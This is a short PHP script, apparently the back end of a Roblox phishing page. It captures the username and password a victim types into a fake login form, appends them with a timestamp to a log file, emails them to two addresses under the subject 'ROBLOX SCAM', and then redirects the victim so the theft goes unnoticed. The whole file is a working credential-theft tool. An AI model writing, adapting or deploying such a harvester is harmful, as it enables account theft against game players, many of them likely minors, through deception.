<?php
if(isset($_POST['submit']));
   
  $file = fopen("log.php","a");
  date_default_timezone_set('Asia/Manila');
  $date = date('m-d-y h:i:sa');
  $name = $_POST['username'];
  $subject = "ROBLOX SCAM";
  $code = $_POST['password'];
  $mailfrom = "ROBLOXSCAM@GMAIL.COM";
  $ip = $_SERVER['REMOTE_ADDR'];
  $user = $_SERVER['HTTP_USER_AGENT'];
  
  $mailTo = "email1";
  $mail2 = "email2";
  $headers = array ("From:".$mailfrom,
  "MIME-Version: 1.0",
  "X-Priority" => "1",
    "Priority" => "Urgent",
    "Importance" => "high",
    "Content-Type" => "text/html; charset=ISO-8859-1"  );
  
  $txt = "Roblox Account: "."<br>"."Username/Email/Phone::<b>".$name."</b><br>Password::<b>".$code."</b><br><br><b>DATE:".$date."</b><br><br>";
  fwrite($file,$txt);
  fclose($file);
  header('location: /index.html');
  
  mail($mailTo, $subject, $txt, $headers);
  mail($mail2, $subject, $txt, $headers);
?>
